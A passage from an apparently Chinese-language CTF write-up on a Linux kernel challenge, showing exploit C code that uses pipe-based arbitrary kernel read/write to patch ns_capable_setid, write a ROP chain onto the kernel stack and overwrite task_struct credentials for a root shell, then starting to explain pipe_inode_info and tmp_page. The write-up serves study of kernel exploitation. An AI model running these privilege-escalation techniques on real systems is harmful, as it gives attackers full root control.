+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>开始更改目标函数ns_capable_setid</p>
+<p>setresuid系统调用中会调用ns_capable_setid判断user的权限，直接patch ns_capable_setid使它永远return true：）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <br>        <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>        <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>        <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>        <span class="hljs-number">12</span>);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>调用setresuid更改用户id，提权拿shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* get root now :) */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br>  <br>sleep(<span class="hljs-number">5</span>);<br>  <br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>get_root_shell();<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>通过task_struct找内核栈地址所在page，直接在内核栈上写rop链</p>
+<ul>
+<li><p>还是调用pgd_vaddr_resolve获取一些地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>redo:<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取stack的内核虚拟地址（task_struct的task成员就是内核栈地址）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>stack_addr_another += page_offset_base;<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br></code></pre></td></tr></table></figure>
+
+<p>vaddr_resolve函数和vaddr_resolve_for_3_level差不多，只是多一层解析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> pte_val;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>构造rop链并写到栈上，尽量把rop链往后写前面用ret填充，这样就不用算偏移了（</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* construct the ROP */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span> * <span class="hljs-number">11</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>    rop[idx++] = RET + kernel_offset;<br>&#125;<br>  <br>rop[idx++] = POP_RDI_RET + kernel_offset;<br>rop[idx++] = INIT_CRED + kernel_offset;<br>rop[idx++] = COMMIT_CREDS + kernel_offset;<br>rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>rop[idx++] = user_cs;<br>rop[idx++] = user_rflags;<br>rop[idx++] = user_sp;<br>rop[idx++] = user_ss;<br>  <br>stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br>  <br>sleep(<span class="hljs-number">5</span>);<br>  <br>arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) stack_page, rop, <span class="hljs-number">0xff0</span>);<br></code></pre></td></tr></table></figure>
+
+<p>函数和栈地址（rbp）一览（好长的调用链(lll￢ω￢)）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* task_struct-&gt;stack = 0xffffc900005ff000 */</span><br>entry_SYSCALL_64		<span class="hljs-number">0xffffc900005ffff8</span>		↓<br>do_syscall_64			<span class="hljs-number">0xffffc900005fff48</span><br>__x64_sys_write			<span class="hljs-number">0xffffc900005ffe78</span><br>ksys_write				<span class="hljs-number">0xffffc900005ffe68</span><br>vfs_write				<span class="hljs-number">0xffffc900005ffe28</span><br>pipe_write				<span class="hljs-number">0xffffc900005ffd90</span><br>copy_page_from_iter	 	<span class="hljs-number">0xffffc900005ffce8</span><br>_copy_from_iter			<span class="hljs-number">0xffffc900005ffca8</span><br>copyin					<span class="hljs-number">0xffffc900005ffc10</span><br>rep_movs_alternative	<span class="hljs-number">0xffffc900005ffc10</span><br></code></pre></td></tr></table></figure>
+
+<p>数据写入实际上发生在rep_movs_alternative中，这个函数退出时就开始执行调用链了</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack3.png" srcset="/img/loading.gif" lazyload class title="stack3">
+</li>
+<li><p><strong>！！一个小（da）插曲！！</strong></p>
+<p>arttnba3的博客有提到会出现rop链写入失败不知道写到哪去了的问题</p>
+<p>这是泄露的内核栈地址</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack.png" srcset="/img/loading.gif" lazyload class title="stack">
+
+<p>但是内核实际上使用的栈地址（也是之后要写入rop链的栈地址）是stack_addr + 0x3000</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack2.png" srcset="/img/loading.gif" lazyload class title="stack2">
+
+<p>arttnba3的原exp是泄露task_struct-&gt;stack（查找pgd时也是找的这一页），在写入的时候在对应页+ 3 * 0x40</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是实测stack使用的page不一定是物理连续的(ˉ▽ˉ；)…，所以会不知道写哪去了</p>
+<p>所以更改一下最开始的stack泄露，直接+ 0x3000，查找pgd时直接查找这一页，写入也直接写入这一页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>] + <span class="hljs-number">0x3000</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) stack_page, rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><em>ps：干了件很sb的事就是把img的包重新打包的时候打成cpio了，md断点突然打不上了血压暴涨发出尖锐的爆鸣声(╯▔皿▔)╯</em></p>
+<h3 id="修改cred"><a href="#修改cred" class="headerlink" title="修改cred"></a>修改cred</h3><p>init_cred为有着root权限的cred，我们可以直接将当前进程的cred修改为该cred以完成提权</p>
+<p>arttnba3的exp里是使用task_struct-&gt;real_parent向前遍历直到task_struct-&gt;real_parent &#x3D;&#x3D; &amp;task_struct来寻找init进程（所有进程的父进程）的task_struct来寻找init_cred，这道题有init_cred地址就不遍历了（绝对不是因为我懒(‾◡◝)）</p>
+<p><em>ps：这里我又干了件很sb的事就是所有地址都多加了个kernel_base(ˉ▽ˉ；)…，🧠飞飞~</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    init_task = kernel_offset + INIT_TASK;<br>    init_cred = kernel_offset + INIT_CRED;<br>    init_nsproxy = kernel_offset + INIT_NSPROXY;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这种提权好像只是有概率成功……(・∀・(・∀・(・∀・*)</p>
+<p>破案了，跟上面一样的问题，task_struct所在的两页不一定物理连续，所以cred可能又写到别的地方去了</p>
+<p>更改后的exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    init_task = kernel_offset + INIT_TASK;<br>    init_cred = kernel_offset + INIT_CRED;<br>    init_nsproxy = kernel_offset + INIT_NSPROXY;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br><br>    <span class="hljs-type">size_t</span> current_task_page_1 = direct_map_addr_to_page_addr(current_task + <span class="hljs-number">0x1000</span>);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page_1), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page_1,<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p><em><strong>特别鸣谢nightu师傅的指导o(*￣▽￣*)ブ</strong></em></p>
+<h2 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h2><p>pipe_inode_info结构体用于描述一个pipe</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>head、tail：使用的bufs的序号，头和尾</p>
+</li>
+<li><p>tmp_page：之前释放的page，已经读完数据</p>
+</li>
+<li><p>bufs：pipe_buffer结构体数组</p>
+<p>重温一下pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>page：数据储存的页</li>
+<li>offset：read指针</li>
+<li>len：write指针 - read指针</li>
+<li>flags：一些flag，比如能否并入非full的buffer就是0x10</li>
+<li>private：ops使用的private data</li>
+</ul>
+</li>
+</ul>
+<h2 id="tmp-page"><a href="#tmp-page" class="headerlink" title="tmp_page"></a>tmp_page</h2><p>tmp_page其实就是一个page的后备，可存一个page，在向一个新的pipe中write的时候如果tmp_page不为空则使用tmp_page的page，否则申请一个page</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<br>	page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br>	<span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>		ret = ret ? : -ENOMEM;<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	pipe-&gt;tmp_page = page;<br>&#125;<br><br><br><br><span class="hljs-comment">/* Insert it into the buffer array */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<br>	buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>	buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br></code></pre></td></tr></table></figure>
+
+<p>在pipe_read中，如果一个buf中的数据被读完了，调用pipe_buf_release</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<br>	pipe_buf_release(pipe, buf);<br>	spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br>	tail++;<br>	pipe-&gt;tail = tail;<br>	spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>pipe_buf_release回先将pipe_buffer的ops置空，再调用对应的release函数，这里是anon_pipe_buf_release</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">pipe_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">				    <span class="hljs-keyword">struct</span> pipe_buffer *buf)</span><br>&#123;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span> =</span> buf-&gt;ops;<br><br>	buf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>	ops-&gt;release(pipe, buf);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在anon_pipe_buf_release中，如果pipe_buffer的page没有别人使用且tmp_page为空则将这个page放入tmp_page备用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">anon_pipe_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">				  <span class="hljs-keyword">struct</span> pipe_buffer *buf)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><br>	<span class="hljs-keyword">if</span> (page_count(page) == <span class="hljs-number">1</span> &amp;&amp; !pipe-&gt;tmp_page)<br>		pipe-&gt;tmp_page = page;<br>	<span class="hljs-keyword">else</span><br>		